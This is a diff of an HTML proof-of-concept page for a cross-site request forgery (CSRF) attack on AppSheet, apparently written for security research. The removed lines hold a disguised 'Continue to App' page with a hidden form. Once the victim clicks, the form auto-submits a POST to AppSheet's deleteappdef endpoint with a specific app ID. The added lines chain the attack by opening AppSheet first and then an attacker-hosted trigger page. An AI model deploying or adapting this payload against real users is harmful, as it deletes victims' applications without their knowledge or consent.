@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Continue to App</title></head>
+  <head>
+    <title>CSRF Chain Demo - Option A</title>
+  </head>
   <body>
-    <p>This page will take you to AppSheet.</p>
-    <a href="https://www.appsheet.com/home/apps" target="_blank" onclick="setTimeout(launchExploit, 3000)">Click here to continue</a>
-
-    <form id="csrf" action="https://www.appsheet.com/template/deleteappdef" method="POST" style="display: none;">
-      <input type="hidden" name="appId" value="075ef5d4-78d3-41b-ab97-29d5c33214a9" />
-    </form>
-
+    <h2>Redirecting to trusted site (AppSheet)...</h2>
     <script>
-      function launchExploit() {
-        document.getElementById('csrf').submit();
-      }
+      // Step 1: Open trusted target (AppSheet) first to make cookies "recent"
+      window.open("https://www.appsheet.com/", "_blank");
+
+      // Step 2: After 3 seconds, open CSRF trigger in new tab
+      setTimeout(() => {
+        window.open("https://yourdomain.github.io/trigger.html", "_blank");
+      }, 3000);
     </script>
   </body>
 </html>
